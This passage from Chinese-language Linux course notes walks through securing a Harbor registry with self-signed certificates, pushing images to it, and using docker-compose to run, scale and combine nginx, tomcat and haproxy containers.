[root@centos7 ~]# touch /root/.rnd
[root@centos7 ~]# mkdir /apps/harbor/certs/
[root@centos7 ~]# cd /apps/harbor/certs/



#生成CA证书
[root@centos7 certs]# openssl req -newkey rsa:4096 -nodes -sha256 -keyout ca.key -x509 -subj "/CN=ca.liusenbiao.org" -days 365 -out ca.crt



#生成harbor主机的证书申请
[root@centos7 certs]# openssl req -newkey rsa:4096 -nodes -sha256 -subj "/CN=harbor.liusenbiao.org" -keyout harbor.liusenbiao.org.key -out harbor.liusenbiao.org.csr



#给harbor主机颁发证书
[root@centos7 certs]# openssl x509 -req -in harbor.liusenbiao.org.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out harbor.liusenbiao.org.crt


[root@centos7 certs]# tree /apps/harbor/certs
/apps/harbor/certs
├── ca.crt
├── ca.key
├── ca.srl
├── harbor.liusenbiao.org.crt
├── harbor.liusenbiao.org.csr
└── harbor.liusenbiao.org.key

0 directories, 6 files



[root@centos7 certs]# vim /apps/harbor/harbor.cfg
hostname = harbor.liusenbiao.org
ui_url_protocol = https
ssl_cert = /apps/harbor/certs/harbor.liusenbiao.org.crt
ssl_cert_key = /apps/harbor/certs/harbor.liusenbiao.org.key




#让配置文件生效
[root@centos7 certs]# cd ..
[root@centos7 harbor]# docker-compose stop
[root@centos7 harbor]# /apps/harbor/prepare
```

![1660532461376](linux体系.assets/1660532461376.png)

![1660533053058](linux体系.assets/1660533053058.png)

![1660533072549](linux体系.assets/1660533072549.png)

###### 48.9.4.5.2 在客户端下载CA的证书

**在客户端下载ca的证书**

```
[root@centos7 ~]# vim /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
10.0.0.87 harbor.liusenbiao.org   #做域名解析



[root@centos7 ~]# mkdir -pv /etc/docker/certs.d/harbor.liusenbiao.org/
[root@centos7 ~]# scp -r harbor.liusenbiao.org:/apps/harbor/certs/ca.crt /etc/docker/certs.d/harbor.liusenbiao.org/
[root@centos7 ~]# tree /etc/docker/certs.d/
/etc/docker/certs.d/
└── harbor.liusenbiao.org
    └── ca.crt

1 directory, 1 file
```

###### 48.9.4.5.3 从客户端上传镜像

```
[root@centos7 ~]# docker pull nginx
[root@centos7 ~]# docker login harbor.liusenbiao.org
Username: admin
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded


[root@centos7 ~]# docker images
REPOSITORY                      TAG                 IMAGE ID            CREATED             SIZE
nginx                           latest              605c77e624dd        7 months ago        141MB
goharbor/chartmuseum-photon     v0.8.1-v1.7.6       ca4e65cc8cbf        2 years ago         114MB
goharbor/harbor-migrator        v1.7.6              bd65976b2563        2 years ago         680MB
goharbor/redis-photon           v1.7.6              477066fd0e02        2 years ago         109MB
goharbor/clair-photon           v2.0.8-v1.7.6       a65550304aa5        2 years ago         165MB
goharbor/notary-server-photon   v0.6.1-v1.7.6       1bfca6aac750        2 years ago         136MB
goharbor/notary-signer-photon   v0.6.1-v1.7.6       8535add7bfa5        2 years ago         133MB
goharbor/harbor-registryctl     v1.7.6              bb06dcda87fa        2 years ago         103MB
goharbor/registry-photon        v2.6.2-v1.7.6       8fa930eedbea        2 years ago         87.7MB
goharbor/nginx-photon           v1.7.6              fea7c162d250        2 years ago         37MB
goharbor/harbor-log             v1.7.6              f9b50bc6e136        2 years ago         82.6MB
goharbor/harbor-jobservice      v1.7.6              cfac2ab2d45a        2 years ago         85.1MB
goharbor/harbor-core            v1.7.6              37379145c410        2 years ago         96.6MB
goharbor/harbor-portal          v1.7.6              eafab006217d        2 years ago         41.7MB
goharbor/harbor-adminserver     v1.7.6              2d91210e25ed        2 years ago         73.3MB
goharbor/harbor-db              v1.7.6              f28a4ae69c04        2 years ago         146MB



#开始上传镜像
[root@centos7 ~]# docker tag 605c77e624dd  harbor.liusenbiao.org/linux/nginx-v1.0
[root@centos7 ~]# docker push harbor.liusenbiao.org/linux/nginx-v1.0
The push refers to repository [harbor.liusenbiao.org/linux/nginx-v1.0]
d874fd2bc83b: Pushed 
32ce5f6a5106: Pushed 
f1db227348d0: Pushed 
b8d6e692a25e: Pushed 
e379e8aedd4d: Pushed 
2edcec3590a4: Pushed 
latest: digest: sha256:ee89b00528ff4f02f2405e4ee221743ebc3f8e8dd0bfd5c4c20a2fa2aaa7ede3 size: 1570
```

![1660534995361](linux体系.assets/1660534995361.png)

### 48.10 单机编排之Docker Compose(了解)

#### 48.10.1 Docker Compse介绍

![1660535771671](linux体系.assets/1660535771671.png)

```
当在宿主机启动较多的容器时候，如果都是手动操作会觉得比较麻烦而且容易出错，此时推荐使用docker单机编排工具 docker-compose。

docker-compose 是 docker 容器的一种单机编排服务，docker-compose 是一个管理多个容器的工具，比如: 可以解决容器之间的依赖关系，就像启动一个nginx 前端服务的时候会调用后端的tomcat，那就得先启动tomcat，但是启动tomcat 容器还需要依赖数据库，那就还得先启动数据库，docker-compose 可以用来解决这样的嵌套依赖关系，并且可以替代docker命令对容器进行创建、启动和停止等手工的操作。

因此，如果说docker命令就像linux的命令，docker compse就像shell脚本，可以自动的执行容器批量操作，从而实现自动化的容器管理，或者说docker命令相当于ansible命令，那么docker compose文件，就相当于ansible-playbook的yaml文件。

docker-compose 项目是Docker 官方的开源项目，负责实现对Docker 容器集群的快速编排，docker-compose 将所管理的容器分为三层，分别是工程（project），服务（service）以及容器（container）。


github地址: https://github.com/docker/compose
官方地址: https://docs.docker.com/compose/
注意：本章内容作为了解，后续有K8s完美代替。
```

#### 48.10.2 安装和准备

##### 48.10.2.1 安装Docker Compose

```
#方法1: 通过pip安装，版本较新docker_compose-1.25.3，推荐使用
[root@ubuntu1804 ~]#apt -y install python3-pip
[root@ubuntu1804 ~]#pip3 install docker-compose
[root@ubuntu1804 ~]#docker-compose --version
docker-compose version 1.25.3, build unknown



#方法2: 直接从github下载安装对应版本
#参看说明: https://github.com/docker/compose/releases/tag/1.25.3
#下载docker-compose-Linux-x86_64

[root@centos7 ~]# wget http://liusenbiao.cn/download/Docker/Docker_Compose/docker-compose-Linux-x86_64-1.25.3
[root@centos7 ~]# cp docker-compose-Linux-x86_64-1.25.3 /usr/bin/
[root@centos7 ~]# chmod +x /usr/bin/docker-compose-Linux-x86_64-1.25.3
[root@centos7 ~]# ln -s /usr/bin/docker-compose-Linux-x86_64-1.25.3 /usr/bin/docker-compose
[root@centos7 ~]# docker-compose --version
docker-compose version 1.25.3, build d4d1b42b



#方法3: 直接安装，版本较旧docker-compose-1.17.1-2，不推荐使用
[root@ubuntu1804 ~]#apt -y install docker-compose
[root@ubuntu1804 ~]#docker-compose --version
docker-compose version 1.17.1, build unknown
```

##### 48.10.2.2 查看命令格式

官方文档: https://docs.docker.com/compose/reference/

```
docker-compose --help
Define and run multi-container applications with Docker.
Usage:
 docker-compose [-f <arg>...] [options] [COMMAND] [ARGS...]
 docker-compose -h|--help
 
 
#选项说明:  
-f，–file FILE #指定Compose模板文件，默认为docker-compose.yml
-p，–project-name NAME #指定项目名称，默认将使用当前所在目录名称作为项目名。
--verbose   #显示更多输出信息
--log-level LEVEL    #定义日志级别 (DEBUG, INFO, WARNING, ERROR, CRITICAL) 
--no-ansi #不显示ANSI 控制字符
-v, --version #显示版本



#以下为命令选项，需要在docker-compose.yml|yaml 文件所在在目录里执行
build  #构建镜像
bundle #从当前docker compose 文件生成一个以<当前目录>为名称的json格式的Docker Bundle 备
份文件
config  -q #查看当前配置，没有错误不输出任何信息
create #创建服务，较少使用
down #停止和删除所有容器、网络、镜像和卷
events #从容器接收实时事件，可以指定json 日志格式，较少使用
exec #进入指定容器进行操作
help #显示帮助细信息
images #显示镜像信息，较少使用
kill #强制终止运行中的容器
logs #查看容器的日志
pause #暂停服务
port #查看端口
ps #列出容器，较少使用
pull #重新拉取镜像，镜像发生变化后，需要重新拉取镜像，较少使用
push #上传镜像
restart #重启服务，较少使用
rm #删除已经停止的服务
run #一次性运行容器
scale  #设置指定服务运行的容器个数
start #启动服务 ，较少使用
stop #停止服务，较少使用
top #显示容器运行状态
unpause #取消暂定
up #创建并启动容器 ，较少使用
```

**范例:** 

```
[root@centos7 ~]# cd /apps/harbor/
[root@centos7 harbor]# docker-compose ps
       Name                     Command                  State                                    Ports                              
-------------------------------------------------------------------------------------------------------------------------------------
harbor-adminserver   /harbor/start.sh                 Up (healthy)                                                                   
harbor-core          /harbor/start.sh                 Up (healthy)                                                                   
harbor-db            /entrypoint.sh postgres          Up (healthy)   5432/tcp                                                        
harbor-jobservice    /harbor/start.sh                 Up                                                                             
harbor-log           /bin/sh -c /usr/local/bin/ ...   Up (healthy)   127.0.0.1:1514->10514/tcp                                       
harbor-portal        nginx -g daemon off;             Up (healthy)   80/tcp                                                          
nginx                nginx -g daemon off;             Up (healthy)   0.0.0.0:443->443/tcp, 0.0.0.0:4443->4443/tcp, 0.0.0.0:80->80/tcp
redis                docker-entrypoint.sh redis ...   Up             6379/tcp                                                        
registry             /entrypoint.sh /etc/regist ...   Up (healthy)   5000/tcp                                                        
registryctl          /harbor/start.sh                 Up (healthy)
```

##### 48.10.2.3 docker compse文件格式

```
官方文档: https://docs.docker.com/compose/compose-file/

docker compose 文件是一个yaml格式的文件，所以注意行首的缩进很严格。
默认docker-compose命令会调用当前目录下的docker-compose.yml的文件，因此一般执行docker-compose命令前先进入docker-compose.yml文件所在目录。
docker compose文件的格式很不同版本，版本不同，语法和格式有所不同，参看以下列表
```

![1660537669702](linux体系.assets/1660537669702.png)

```
docker compose版本众多，以下通过具体示例说明docker compose的使用方法
```

#### 48.10.3 从docker compose启动单个容器

注意: 使用Docker compose之前，先要安装docker

##### 48.10.3.1 创建docker compose文件

```
#docker compose文件可在任意目录，创建文件名为docker-compose.yml配置文件，要注意前后的缩进
[root@centos7 docker-compose]# docker run -d -p 8080:80 harbor.liusenbiao.org/linux/nginx-v1.0
9b3894caeaf6c6089c2977efcd56f76f18f5cc117749eeead2089cb3cfc5900
[root@ubuntu1804 ~]#docker-compose --version
docker-compose version 1.25.4, build unknown
[root@ubuntu1804 ~]#mkdir /data/docker-compose
[root@ubuntu1804 ~]#cd /data/docker-compose
[root@ubuntu1804 docker-compose]#vim docker-compose.yml
[root@ubuntu1804 docker-compose]#cat docker-compose.yml
service-nginx-web:
 image: harbor.liusenbiao.org/linux/nginx-v1.0
 container_name: nginx-web
 expose:
   - 80
   - 443
 ports:
    - "8081:80"
    - "8443:443"
```

##### 48.10.3.2 查看配置和格式检查

```
[root@centos7 docker-compose]# docker-compose config
services:
  service-nginx-web:
    container_name: nginx-web
    expose:
    - 80
    - 443
    image: harbor.liusenbiao.org/linux/nginx-v1.0
    network_mode: bridge
    ports:
    - 8081:80/tcp
    - 8443:443/tcp
version: '2.1'


[root@centos7 docker-compose]#docker-compose config -q


#改错ocker-compose文件格式
[root@ubuntu1804 docker-compose]#vim docker-compose.yml
service-nginx-web   #改此行，最后的”:"删除                           
 image: harbor.liusenbiao.org/linux/nginx-v1.0
 container_name: nginx-web
 expose:
   - 80
   - 443
 ports:
    - "8081:80"
    - "8443:443"
    
[root@ubuntu1804 docker-compose]#docker-compose config -q
ERROR: yaml.scanner.ScannerError: mapping values are not allowed here
  in "./docker-compose.yml", line 2, column 8
```

##### 48.10.3.3 启动容器

**注意: 必须要在docker compose文件所在的目录执行**

```
#前台启动
[root@centos7 docker-compose]# docker-compose up
Creating nginx-web ... done
Attaching to nginx-web
nginx-web            | /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
nginx-web            | /docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/
nginx-web            | /docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh
nginx-web            | 10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf
nginx-web            | 10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf
nginx-web            | /docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh
nginx-web            | /docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh
nginx-web            | /docker-entrypoint.sh: Configuration complete; ready for start up



[root@centos7 docker-compose]# docker ps
CONTAINER ID        IMAGE                                    COMMAND                  CREATED             STATUS              PORTS                                         NAMES
2fb913464b27        harbor.liusenbiao.org/linux/nginx-v1.0   "/docker-entrypoint.…"   4 minutes ago       Up 4 minutes        0.0.0.0:8081->80/tcp, 0.0.0.0:8443->443/tcp   nginx-web
```

![1660540379292](linux体系.assets/1660540379292.png)

##### 48.10.3.4 结束前台执行

```
[root@centos7 docker-compose]# pwd
/data/docker-compose
[root@centos7 docker-compose]# docker-compose kill
Killing nginx-web ... done


[root@centos7 docker-compose]# docker-compose ps
  Name                 Command                State     Ports
-------------------------------------------------------------
nginx-web   /docker-entrypoint.sh ngin ...   Exit 137   



[root@centos7 docker-compose]# docker-compose start
Starting service-nginx-web ... done


[root@centos7 docker-compose]# docker-compose ps
  Name                 Command               State                      Ports                   
------------------------------------------------------------------------------------------------
nginx-web   /docker-entrypoint.sh ngin ...   Up      0.0.0.0:8443->443/tcp, 0.0.0.0:8081->80/tcp
```

##### 48.10.3.4 删除容器

```
[root@ubuntu1804 docker-compose]#docker-compose ps
 Name             Command           State   Ports
 nginx-web   /apps/nginx/sbin/nginx   Exit 0   
 
 
#只删除停止的容器
[root@ubuntu1804 docker-compose]#docker-compose rm
Going to remove nginx-web
Are you sure? [yN] y
Removing nginx-web ... done
[root@ubuntu1804 docker-compose]#docker-compose up -d
Creating nginx-web ... done
[root@ubuntu1804 docker-compose]#docker-compose rm
No stopped containers


#停止并删除容器及镜像
[root@ubuntu1804 docker-compose]#docker-compose down
Stopping nginx-web ... done
Removing nginx-web ... done
[root@ubuntu1804 docker-compose]#docker-compose ps 
Name   Command   State   Ports
------------------------------
[root@ubuntu1804 docker-compose]#docker ps -a
CONTAINER ID       IMAGE               COMMAND             CREATED             
STATUS             PORTS               NAMES


#也会自动删除镜像
[root@ubuntu1804 docker-compose]#docker-compose images
Container   Repository   Tag   Image Id   Size
----------------------------------------------
```

##### 48.10.3.5 后台执行

```
[root@ubuntu1804 docker-compose]#docker-compose up -d
Creating nginx-web ... done


[root@ubuntu1804 docker-compose]#docker-compose ps 
 Name             Command           State                   Ports             
     
--------------------------------------------------------------------------------
-----
nginx-web   /apps/nginx/sbin/nginx   Up      0.0.0.0:443->443/tcp, 0.0.0.0:80-
>80/tcp
[root@ubuntu1804 docker-compose]#curl 127.0.0.1/app/
Test Page in app
[root@ubuntu1804 docker-compose]#curl http://127.0.0.1/app/
Test Page in app
```

##### 48.10.3.6 停止和启动与日志查看

```
[root@ubuntu1804 docker-compose]#docker-compose stop
Stopping nginx-web ... done
[root@ubuntu1804 docker-compose]#docker-compose ps 
 Name             Command           State   Ports
---------------------------------------------------
nginx-web   /apps/nginx/sbin/nginx   Exit 0


[root@ubuntu1804 docker-compose]#docker-compose start 
Starting service-nginx-web ... done
[root@ubuntu1804 docker-compose]#docker-compose ps
 Name             Command           State                   Ports             
     
--------------------------------------------------------------------------------
-----
nginx-web   /apps/nginx/sbin/nginx   Up      0.0.0.0:443->443/tcp, 0.0.0.0:80->80/tcp


[root@ubuntu1804 docker-compose]#docker-compose restart
Restarting nginx-web ... done
[root@ubuntu1804 docker-compose]#docker-compose ps 
 Name             Command           State                   Ports             
     
--------------------------------------------------------------------------------
-----
nginx-web   /apps/nginx/sbin/nginx   Up      0.0.0.0:443->443/tcp, 0.0.0.0:80->80/tcp




#执行上面操作时，可以同时开一个终端，观察日事件
[root@ubuntu1804 docker-compose]#docker-compose events
2020-02-04 15:38:13.253822 container kill
5d92e4da8679a973145e5b4db364ae8cf8596a03c4fd0b3b6a28213a2f155be6 
(image=10.0.0.102/example/nginx-centos7-base:1.6.1, name=nginx-web)
2020-02-04 15:38:13.531208 container die 
5d92e4da8679a973145e5b4db364ae8cf8596a03c4fd0b3b6a28213a2f155be6 
(image=10.0.0.102/example/nginx-centos7-base:1.6.1, name=nginx-web)
2020-02-04 15:38:13.631137 container stop
5d92e4da8679a973145e5b4db364ae8cf8596a03c4fd0b3b6a28213a2f155be6 
(image=10.0.0.102/example/nginx-centos7-base:1.6.1, name=nginx-web)
2020-02-04 15:38:15.137495 container start
5d92e4da8679a973145e5b4db364ae8cf8596a03c4fd0b3b6a28213a2f155be6 
(image=10.0.0.102/example/nginx-centos7-base:1.6.1, name=nginx-web)
2020-02-04 15:38:15.137546 container restart
5d92e4da8679a973145e5b4db364ae8cf8596a03c4fd0b3b6a28213a2f155be6 
(image=10.0.0.102/example/nginx-centos7-base:1.6.1, name=nginx-web)




#以json格式显示日志
[root@ubuntu1804 docker-compose]#docker-compose events --json
{"time": "2020-02-04T15:48:22.423539", "type": "container", "action": "kill", 
"id": "19d72e9bc85842d8879d7dcf2a3d2defd79a5a0c3c3d974ddfbbbc6e95bf910b", 
"service": "service-nginx-web", "attributes": {"name": "nginx-web", "image": 
"10.0.0.102/example/nginx-centos7-base:1.6.1"}}
{"time": "2020-02-04T15:48:22.537200", "type": "container", "action": 
"exec_die", "id": 
"19d72e9bc85842d8879d7dcf2a3d2defd79a5a0c3c3d974ddfbbbc6e95bf910b", "service": 
{"time": "2020-02-04T15:48:23.979468", "type": "container", "action": "restart", 
"id": "19d72e9bc85842d8879d7dcf2a3d2defd79a5a0c3c3d974ddfbbbc6e95bf910b", 
"service": "service-nginx-web", "attributes": {"name": "nginx-web", "image": 
"10.0.0.102/example/nginx-centos7-base:1.6.1"}}
```

##### 48.10.3.7 暂停和恢复

```
##容器的暂停
[root@ubuntu1804 docker-compose]#docker-compose pause
Pausing nginx-web ... done
[root@ubuntu1804 docker-compose]#docker-compose ps 
 Name             Command           State                     Ports             
     
--------------------------------------------------------------------------------
------
nginx-web   /apps/nginx/sbin/nginx   Paused   0.0.0.0:443->443/tcp, 0.0.0.0:80-
>80/tcp
[root@ubuntu1804 docker-compose]#curl -m 1 http://127.0.0.1/app/
curl: (28) Operation timed out after 1002 milliseconds with 0 bytes received


#容器的恢复
[root@ubuntu1804 docker-compose]#docker-compose unpause
Unpausing nginx-web ... done
[root@ubuntu1804 docker-compose]#docker-compose ps 
 Name             Command           State                   Ports             
     
--------------------------------------------------------------------------------
-----
nginx-web   /apps/nginx/sbin/nginx   Up      0.0.0.0:443->443/tcp, 0.0.0.0:80->80/tcp
[root@ubuntu1804 docker-compose]#curl -m 1 http://127.0.0.1/app/
Test Page in app
```

##### 48.10.3.8 指定同时启动容器的数量

```
[root@centos7 docker-compose]# docker images
REPOSITORY                               TAG                 IMAGE ID            CREATED             SIZE
harbor.liusenbiao.org/liu/centos7-base   v2                  58296258e2fa        18 hours ago        504MB
nginx                                    latest              605c77e624dd        7 months ago        141MB
harbor.liusenbiao.org/linux/nginx-v1.0   latest              605c77e624dd        7 months ago        141MB
goharbor/chartmuseum-photon              v0.8.1-v1.7.6       ca4e65cc8cbf        2 years ago         114MB
goharbor/harbor-migrator                 v1.7.6              bd65976b2563        2 years ago         680MB
goharbor/redis-photon                    v1.7.6              477066fd0e02        2 years ago         109MB
goharbor/clair-photon                    v2.0.8-v1.7.6       a65550304aa5        2 years ago         165MB
goharbor/notary-server-photon            v0.6.1-v1.7.6       1bfca6aac750        2 years ago         136MB
goharbor/notary-signer-photon            v0.6.1-v1.7.6       8535add7bfa5        2 years ago         133MB
goharbor/harbor-registryctl              v1.7.6              bb06dcda87fa        2 years ago         103MB
goharbor/registry-photon                 v2.6.2-v1.7.6       8fa930eedbea        2 years ago         87.7MB
goharbor/nginx-photon                    v1.7.6              fea7c162d250        2 years ago         37MB
goharbor/harbor-log                      v1.7.6              f9b50bc6e136        2 years ago         82.6MB
goharbor/harbor-jobservice               v1.7.6              cfac2ab2d45a        2 years ago         85.1MB
goharbor/harbor-core                     v1.7.6              37379145c410        2 years ago         96.6MB
goharbor/harbor-portal                   v1.7.6              eafab006217d        2 years ago         41.7MB
goharbor/harbor-adminserver              v1.7.6              2d91210e25ed        2 years ago         73.3MB
goharbor/harbor-db                       v1.7.6              f28a4ae69c04        2 years ago         146MB




[root@centos7 docker-compose]# vim docker-compose.yml 
service-nginx-web:
 image: harbor.liusenbiao.org/linux/nginx-v1.0
 container_name: nginx-web
 expose:
   - 80
   - 443
 ports:
    - "8081:80"
    - "8443:443"
service-nginx:
 image: harbor.liusenbiao.org/liu/centos7-base:v2
 container_name: centos01
 
 
 
 
[root@centos7 docker-compose]# docker-compose config -q
[root@centos7 docker-compose]# docker-compose up
Starting nginx-web ... done
Creating centos01  ... done
Attaching to nginx-web, centos01
nginx-web            | /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration
nginx-web            | /docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/
nginx-web            | /docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh
nginx-web            | 10-listen-on-ipv6-by-default.sh: info: IPv6 listen already enabled
nginx-web            | /docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh
nginx-web            | /docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh
nginx-web            | /docker-entrypoint.sh: Configuration complete; ready for start up
nginx-web            | 2022/08/15 05:48:44 [notice] 1#1: using the "epoll" event method
nginx-web            | 2022/08/15 05:48:44 [notice] 1#1: nginx/1.21.5
nginx-web            | 2022/08/15 05:48:44 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
nginx-web            | 2022/08/15 05:48:44 [notice] 1#1: OS: Linux 3.10.0-1160.el7.x86_64
nginx-web            | 2022/08/15 05:48:44 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
nginx-web            | 2022/08/15 05:48:44 [notice] 1#1: start worker processes
nginx-web            | 2022/08/15 05:48:44 [notice] 1#1: start worker process 23
nginx-web            | 2022/08/15 05:48:44 [notice] 1#1: start worker process 24
nginx-web            | 2022/08/15 05:48:44 [notice] 1#1: start worker process 25
nginx-web            | 2022/08/15 05:48:44 [notice] 1#1: start worker process 26
centos01 exited with code 0



#docker-compose扩容(同时起多个容器)
[root@centos7 docker-compose]# cat docker-compose.yml 
service-nginx-web:
 image: harbor.liusenbiao.org/linux/nginx-v1.0
service-nginx:
 image: harbor.liusenbiao.org/liu/centos7-base:v2
 container_name: centos0



[root@centos7 docker-compose]# docker-compose ps
Name   Command   State   Ports
------------------------------


[root@centos7 docker-compose]# docker-compose up -d --scale service-nginx-web=2
Creating docker-compose_service-nginx-web_1 ... done
Creating docker-compose_service-nginx-web_2 ... done
Creating centos01                           ... done


[root@centos7 docker-compose]# docker-compose ps
               Name                             Command               State    Ports 
-------------------------------------------------------------------------------------
centos01                             /bin/bash                        Exit 0         
docker-compose_service-nginx-web_1   /docker-entrypoint.sh ngin ...   Up       80/tcp
docker-compose_service-nginx-web_2   /docker-entrypoint.sh ngin ...   Up       80/tcp
```

#### 48.10.4 从docker compose启动多个容器

##### 48.10.4.1 编辑docker-compose文件并使用数据卷

```
#注意: 同一个文件 ，数据卷的优先级比镜像内的文件优先级高
[root@ubuntu1804 docker-compose]#vim docker-compose.yml 
[root@ubuntu1804 docker-compose]#cat docker-compose.yml 
service-nginx-web:
 image: 10.0.0.102/example/nginx-centos7-base:1.6.1
 container_name: nginx-web 
 volumes:
    - /data/nginx:/apps/nginx/html/#指定数据卷，将宿主机/data/nginx挂载到容器/apps/nginx/html
 expose:
   - 80
   - 443
 ports:
    - "80:80"
    - "443:443"
    
service-tomcat-app1:
 image: 10.0.0.102/example/tomcat-web:app1
 container_name: tomcat-app1
 expose:
    - 8080
 ports:
    - "8081:8080"
    
service-tomcat-app2:
 image: 10.0.0.102/example/tomcat-web:app2
 container_name: tomcat-app2
 expose:
    - 8080
 ports:
    - "8082:8080"
    
    
#在宿主机准备nginx测试页面文件
[root@ubuntu1804 docker-compose]#mkdir /data/nginx
[root@ubuntu1804 docker-compose]#echo Docker compose test page > /data/nginx/index.html
```

##### 48.10.4.2 启动容器并验证结果

```
[root@ubuntu1804 docker-compose]#docker-compose up -d
Pulling service-tomcat-app1 (10.0.0.102/example/tomcat-web:app1)...
app1: Pulling from example/tomcat-web
f34b00c7da20: Already exists
544476d462f7: Already exists
39345915aa1b: Already exists
4b792f2bae38: Already exists
4439447a3522: Already exists
fe34d2ec1dd0: Already exists
b8487ca03126: Already exists
5a475b7d8b1a: Already exists
df8703d3d2dd: Already exists
f0da1ffa7aa7: Pull complete
80fd4c70e670: Pull complete
c2a0247d7bfa: Pull complete
b0977ed809cd: Pull complete
Digest: sha256:e0aba904df6095ea04c594d6906101f8e5f4a6ceb0a8f9b24432c47698d0caa8
Status: Downloaded newer image for 10.0.0.102/example/tomcat-web:app1
Pulling service-tomcat-app2 (10.0.0.102/example/tomcat-web:app2)...
app2: Pulling from example/tomcat-web
f34b00c7da20: Already exists
544476d462f7: Already exists
39345915aa1b: Already exists
4b792f2bae38: Already exists
4439447a3522: Already exists
fe34d2ec1dd0: Already exists
b8487ca03126: Already exists
5a475b7d8b1a: Already exists
df8703d3d2dd: Already exists
f0da1ffa7aa7: Already exists
80fd4c70e670: Already exists
1a55cb76a801: Pull complete
565ab795f82a: Pull complete
Digest: sha256:c4d6f166c3933f6c1ba59c84ea0518ed653af25f28b87981c242b0deff4209bb
Status: Downloaded newer image for 10.0.0.102/example/tomcat-web:app2
Creating tomcat-app1 ... done
Creating tomcat-app2 ... done
Creating nginx-web   ... done


[root@ubuntu1804 docker-compose]#docker-compose ps 
   Name                 Command               State                   Ports   
               
--------------------------------------------------------------------------------
---------------
nginx-web     /apps/nginx/sbin/nginx           Up      0.0.0.0:443->443/tcp, 
0.0.0.0:80->80/tcp
tomcat-app1   /apps/tomcat/bin/run_tomcat.sh   Up      8009/tcp, 0.0.0.0:8081->8080/tcp        
tomcat-app2   /apps/tomcat/bin/run_tomcat.sh   Up      8009/tcp, 0.0.0.0:8082->8080/tcp    



[root@ubuntu1804 docker-compose]#curl http://127.0.0.1/
Docker compose test page
[root@ubuntu1804 docker-compose]#curl http://127.0.0.1:8081/app/
Tomcat Page in app1
[root@ubuntu1804 docker-compose]#curl http://127.0.0.1:8082/app/
Tomcat Page in app
```

#### 48.10.5 实现单机版的Haproxy+Nginx+Tomcat

```
编写 docker-compose.yml文件，实现单机版本的nginx+tomcat的动静分离web站点，要求从nginx作为访问入口，当访问指定URL的时候转发至tomcat服务器响应.
```

![1660544355456](linux体系.assets/1660544355456.png)

##### 48.10.5.1 制作haproxy镜像

**编辑Dockerfile文件**

```
[root@ubuntu1804 ~]#cat /data/dockerfile/web/haproxy/2.1.2-centos7-base/Dockerfile 
#Haproxy Base Image
FROM centos7-base:v1
LABEL maintainer="liusenbiao <root@liusenbiao.com>"
ADD haproxy-2.1.2.tar.gz /usr/local/src/ 
RUN cd /usr/local/src/haproxy-2.1.2 \
   && make ARCH=x86_64 TARGET=linux-glibc USE_PCRE=1 USE_OPENSSL=1 USE_ZLIB=1 USE_SYSTEMD=1 USE_CPU_AFFINITY=1 PREFIX=/apps/haproxy \
   && make install PREFIX=/apps/haproxy \
   && ln -s /apps/haproxy/sbin/haproxy /usr/sbin/ \
   && mkdir /apps/haproxy/run \
   && rm -rf /usr/local/src/haproxy*  
ADD haproxy.cfg /etc/haproxy/
ADD run_haproxy.sh /usr/bin
EXPOSE 80 9999
CMD ["run_haproxy.sh"]
```

**前台启动脚本**

```
[root@ubuntu1804 ~]#cat /data/dockerfile/web/haproxy/2.1.2-centos7-base/run_haproxy.sh
#!/bin/bash
haproxy -f /etc/haproxy/haproxy.cfg
tail -f /etc/hosts
```

**haproxy参数文件**

```
[root@ubuntu1804 ~]#cat /data/dockerfile/web/haproxy/2.1.2-centos7-base/haproxy.cfg
global
chroot /apps/haproxy
#stats socket /var/lib/haproxy/haproxy.sock mode 600 level admin
uid 99
gid 99
daemon
nbproc 1
pidfile /apps/haproxy/run/haproxy.pid
log 127.0.0.1 local3 info
defaults
option http-keep-alive
option forwardfor
mode http
timeout connect 300000ms
timeout client 300000ms
timeout server 300000ms
listen stats
 mode http
 bind 0.0.0.0:9999
 stats enable
 log global
 stats uri   /haproxy-status
 stats auth haadmin:123456 
 
 
listen web_port
 bind 0.0.0.0:80
 mode http
 log global
 balance roundrobin
 server nginx-web service-nginx-web:80 check inter 3000 fall 2 rise 5
#service-nginx-web是docker-compose.yml文件中使用的地址
```

**镜像build和上传harbor的脚本**

```
[root@ubuntu1804 ~]#cat /data/dockerfile/web/haproxy/2.1.2-centos7-base/build.sh 
#!/bin/bash
docker build -t 10.0.0.102/example/haproxy-centos7-base:2.1.2 .
docker push 10.0.0.102/example/haproxy-centos7-base:2.1.2
```

**准备压缩包及其他文件**

```
[root@ubuntu1804 ~]#tree /data/dockerfile/web/haproxy/2.1.2-centos7-base/
/data/dockerfile/web/haproxy/2.1.2-centos7-base/
├── build.sh
├── Dockerfile
├── haproxy-2.1.2.tar.gz
├── haproxy.cfg
└── run_haproxy.sh

0 directories, 5 files
```

**执行构建镜像并上传 barbor**

```
[root@ubuntu1804 ~]#cd /data/dockerfile/web/haproxy/2.1.2-centos7-base/
[root@ubuntu1804 2.1.2-centos7-base]#bash build.sh 
Sending build context to Docker daemon   2.67MB
Step 1/8 : FROM centos7-base:v1
---> 34ab3afcd3b3
Step 2/8 : LABEL maintainer="liusenbiao <root@liusenbiao.com>"
---> Using cache
---> 6206742174bc
Step 3/8 : ADD haproxy-2.1.2.tar.gz /usr/local/src/
---> Using cache
---> 21a146f4e75d
